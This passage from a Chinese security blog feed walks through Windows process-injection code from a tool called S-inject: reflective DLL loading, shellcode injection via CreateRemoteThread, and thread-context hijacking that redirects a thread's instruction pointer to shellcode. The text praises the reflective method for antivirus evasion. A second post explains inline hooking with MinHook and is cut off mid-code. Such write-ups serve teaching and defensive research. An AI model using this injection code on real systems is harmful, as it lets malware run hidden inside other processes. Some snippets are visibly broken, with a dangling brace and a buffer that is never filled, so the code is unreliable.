href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L205">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L205</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::ReflectInject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="keyword">this</span>-&gt;DllPath.<span class="built_in">c_str</span>(), GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line">    LPVOID pBase = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>* buffer = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize];</span><br><span class="line">    DWORD dwReadSize;</span><br><span class="line"></span><br><span class="line">    DWORD dwReflectiveLoaderOffset = <span class="keyword">this</span>-&gt;<span class="built_in">dwGetOffset</span>(buffer, (CHAR*)<span class="string">&quot;ReflectiveLoader&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pBase, buffer, dwFileSize, &amp;dwWriteSize);</span><br><span class="line">    LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pBase + dwReflectiveLoaderOffset);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">1024</span> * <span class="number">1024</span>, lpReflectiveLoader, pBase, (DWORD)<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于<code>dwGetOffset</code>函数 <a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L775">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L775</a> 主要是PE文件格式<code>RVA</code>那套东西，本片文章不再赘述</p><p>回到反射式注入，我们的DLL并没有直接调用<code>DllMain</code>，而是先调用了<code>ReflectiveLoader</code>这个函数</p><p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c#L51">https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c#L51</a></p><p>函数主要是从Ldr遍历链上dll，找到一些关键函数例如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// we stop searching when we have found everything we need.</span></span><br><span class="line"><span class="keyword">if</span>( pLoadLibraryA &amp;&amp; pGetProcAddress &amp;&amp; pVirtualAlloc &amp;&amp; pNtFlushInstructionCache )</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>之后利用这个API来加载PE文件，大致步骤就是这样的</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3f06631c00f5d4eb665ece903df9d1f4.png" alt="image-20240930094325881" /></p><p>最后跳转到映射好的DllMain中执行</p><p>这种方法的好处十分明显，在远程进程中进行映射，而且由于只需要将内容写入远程进程，所以适合从网络加载，对免杀有好处。缺点自然就是构造dll较为复杂，因为需要一个loader去加载</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8fdbc55fb2225d8105c30006a7e59c06.png" alt="image-20240930095417856" /></p><h1 id="b-shellcode注入"><a class="markdownIt-Anchor" href="#b-shellcode注入"></a> B. Shellcode注入</h1><p>这里复习下远程线程调用注入的步骤</p><ol><li>将dll的路径写入远程的进程(待注入的进程)</li><li>获得远程进程<code>LoadLibraryA</code>函数的地址</li><li>使用<code>createRemoteThread </code>创建新的进程</li></ol><p>有趣的是如果我们在步骤2中传入的不是远程进程<code>LoadLibraryA</code>函数的地址，而是远程的shellcode地址，这让整个情况变得有意思起来，这样就可以使用远程进程加载shellcode了</p><p>这里举个例子</p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L472">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L472</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::ShellcodeInject</span><span class="params">(string basedsc, DWORD pid)</span> </span>&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line"></span><br><span class="line">    string shellcode = <span class="built_in">Base64Decode</span>(basedsc);</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    DWORD size = shellcode.<span class="built_in">size</span>() + <span class="number">1</span>;</span><br><span class="line">    LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, shellcode.<span class="built_in">c_str</span>(), size - <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)pAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hRemoteProcess, INFINITE);</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, shellcode.<span class="built_in">size</span>() + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好，这里就可以看下关于上下文注入了</p><p><a href="https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L585">https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L585</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::ContextShellcodeInject</span><span class="params">(string basedsc, DWORD pid)</span> </span>&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line"></span><br><span class="line">    string shellcode = <span class="built_in">Base64Decode</span>(basedsc);</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    DWORD size = shellcode.<span class="built_in">size</span>() + <span class="number">1</span>;</span><br><span class="line">    LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, shellcode.<span class="built_in">c_str</span>(), size - <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    shellcode = <span class="string">&quot;\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">    HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    BOOL bStat = FALSE;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">    CONTEXT context = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    context.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到第一个线程(main thread)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line">        <span class="comment">//main thread can not be hijacked</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (te.th32OwnerProcessID == pid) &#123;</span><br><span class="line">                hThread = <span class="built_in">OpenThread</span>(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">                DWORD lpflOldProtect;</span><br><span class="line">                <span class="built_in">VirtualProtectEx</span>(hProcess, pAddress, (SIZE_T)size + <span class="number">1</span>, PAGE_EXECUTE, &amp;lpflOldProtect);</span><br><span class="line">                dwRet = <span class="built_in">SuspendThread</span>(hThread);</span><br><span class="line"></span><br><span class="line">                dwRet = <span class="built_in">GetThreadContext</span>(hThread, &amp;context);</span><br><span class="line">                </span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">                context.Rip = (DWORD64)pAddress;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                context.Eip = (DWORD)pAddress;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// _WIN64</span></span></span><br><span class="line">                dwRet = <span class="built_in">SetThreadContext</span>(hThread, &amp;context);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心代码在于</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">                dwRet = <span class="built_in">SuspendThread</span>(hThread);</span><br><span class="line">                dwRet = <span class="built_in">GetThreadContext</span>(hThread, &amp;context);</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">                context.Rip = (DWORD64)pAddress;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                context.Eip = (DWORD)pAddress;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// _WIN64</span></span></span><br><span class="line">                dwRet = <span class="built_in">SetThreadContext</span>(hThread, &amp;context);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">ResumeThread</span>(hThread);</span><br></pre></td></tr></table></figure><p>和APC注入一样，便利了线程，然后选择一个线程暂停他(<code>SuspendThread</code>)，然后获得当前线程的上下文，上下文包含了寄存器信息，然后我们就该他的<code>ip</code>寄存器，这样恢复线程后的，下一条指令就是我们的shellcode的地方。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ&quot;&gt;https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【源码分析】MinHook源代码分析</title>
    <link href="https://joe1sn.eu.org/2024/07/24/minhook-source/"/>
    <id>https://joe1sn.eu.org/2024/07/24/minhook-source/</id>
    <published>2024-07-24T07:44:48.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>世界上果然没有魔法，到最后发现都是魔术</p><p>解读的项目地址：<a href="https://github.com/TsudaKageyu/minhook">https://github.com/TsudaKageyu/minhook</a></p><p>公众号：<a href="https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw">https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="p1-hook原理"><a class="markdownIt-Anchor" href="#p1-hook原理"></a> P1. Hook原理</h1><p>首先使用Visual Studio中的MSVC编译器，按照Release x64 禁用代码优化 编译如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;123\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在<code>main</code>函数中的<code>hello()</code>处加上断点（ps:为什么选择了release版本任然能够调试：1.没有antiDebug。2.调式符号依然保存了。3.代码量小,就算开了代码优化也不会有较大影响）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/96d7730a2e1dc806a77fc5ef76f72aab.png" alt="image-20240724155339931" /></p><p>步入<code>call</code>汇编</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1566587521dcc11bbb6d5d9126c8e574.png" alt="image-20240724155353773" /></p><p>这里就是目前编译情况下的<code>hello</code>函数的汇编实现了。</p><p><strong>那么我们就可以找到<code>hello</code>函数的地址，然后覆盖他的汇编，让执行流转移到我们创建的新的函数</strong>。所以我们继续写有如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;123\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">newhello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;This is New hello\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jmpopcode[<span class="number">14</span>] = &#123;</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD64 oldFuncAddr = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(hello);</span><br><span class="line">    DWORD64 newFuncAddr = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(newhello);</span><br><span class="line">    </span><br><span class="line">    DWORD old;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(hello, <span class="number">15</span>, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">1</span>) = (DWORD32)newFuncAddr;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">9</span>) = (DWORD32)(newFuncAddr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(hello, jmpopcode, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然是调用<code>hello()</code>的使用跟进去</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c904ce64aeb9d288cf86bd7e1a672f1d.png" alt="image-20240724161051582" /></p><p>执行到<code>00007FF7FED8100D</code>，会跳转到我们的函数<code>newhello()</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2716149fcfd3d091c904996de6c2937e.png" alt="image-20240724161136732" /></p><p>这样我们就完成了一次hook，<strong>后续无论调用多少次<code>hello</code>函数，都会执行为<code>newhello</code>函数</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1a23c14c14305eb30094c0f4de354783.png" alt="image-20240724161944509" /></p><p>关于我们这里的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jmpopcode[<span class="number">14</span>] = &#123;</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">1</span>) = (DWORD32)newFuncAddr;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">9</span>) = (DWORD32)(newFuncAddr &gt;&gt; <span class="number">32</span>);</span><br></pre></td></tr></table></figure><p><code>jmpopcode</code>实际上是这样一段汇编代码，假如我们要跳转到<code>0x 20000000 10000000</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 0x10000000</span><br><span class="line">mov dword [rsp+4], 0x20000000</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这是在64位下一种特殊的跳转代码，由于<code>jmp</code>指令的限制，只能2GB内内存寻址，到了x64寻址空间大大加大，单纯<code>jmp</code>和<code>call</code>已经无法跳转到地址，所以我们将带跳转的地址依次将低位、高位移动到栈顶（rsp），这样ret就能直接跳转了，这种好处就是不会污染栈和寄存器。</p><p>如果在x86（32位）的情况下，直接使用<code>jmp</code>跳转即可</p><p>总结一下hook的步骤就是：</p><ol><li>找到待hook函数的地址</li><li>覆盖待hook函数汇编码，让待hook函数跳转到新的函数</li><li>取消hook恢复待hook函数的汇编码即可</li></ol><h1 id="p2-使用minhook"><a class="markdownIt-Anchor" href="#p2-使用minhook"></a> P2. 使用MinHook</h1><p>在项目文件夹中，然后再vs中包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TsudaKageyu/minhook</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b6609ede11395995cdce61b89e6f495c.png" alt="image-20240724163342822" /></p><p>现在我们使用MinHook来实现P1中的功能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;minhook/MinHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;123\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">newhello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;This is New hello\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">LPVOID *lpOldHello = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">MH_Initialize</span>();</span><br><span class="line"><span class="built_in">MH_CreateHook</span>(hello, newhello, lpOldHello);</span><br><span class="line"><span class="built_in">MH_EnableHook</span>(hello);</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="built_in">MH_DisableHook</span>(hello);</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6951a9d4f37ad22436021d7bdcf891e8.png" alt="image-20240724163902834" /></p><p>尝试Hook系统函数Sleep</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;minhook/MinHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义指向原始 Sleep 函数的指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(WINAPI* Sleep_t)</span><span class="params">(DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义指向原始 Sleep 函数的指针</span></span><br><span class="line">Sleep_t fpSleep = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的 MySleep 函数</span></span><br><span class="line"><span class="comment">//  参数要保持一致</span></span><br><span class="line"><span class="function"><span class="type">void</span> WINAPI <span class="title">MySleep</span><span class="params">(DWORD dwMilliseconds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;MySleep called with &quot;</span> &lt;&lt; dwMilliseconds &lt;&lt; <span class="string">&quot; milliseconds&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用原始的 Sleep 函数</span></span><br><span class="line">    <span class="built_in">fpSleep</span>(dwMilliseconds);</span><br><span class="line">&#125;</span><br><span 